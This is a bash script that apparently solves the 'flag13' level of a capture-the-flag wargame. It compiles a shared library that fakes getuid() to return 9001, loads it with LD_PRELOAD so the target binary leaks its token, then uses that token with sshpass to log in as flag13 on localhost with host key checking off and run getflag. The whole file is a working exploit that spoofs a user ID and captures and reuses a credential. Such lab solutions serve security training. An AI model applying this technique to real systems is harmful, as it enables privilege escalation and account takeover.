#!/usr/bin/env bash

echo "int getuid() {return 9001;}" >/tmp/flag13.c
gcc -o /tmp/flag13.so -shared /tmp/flag13.c &>/dev/null
cp -f /home/flag13/flag13 /tmp/

flagpass="$(
    LD_PRELOAD=/tmp/flag13.so /tmp/flag13 | awk '{print $NF}'
)"

rm -f /tmp/flag13*

if [[ -n $flagpass ]]; then
    SSHPASS="$flagpass" sshpass -e -- \
        ssh -l flag13 -o StrictHostKeyChecking=no 127.0.0.1 getflag
fi
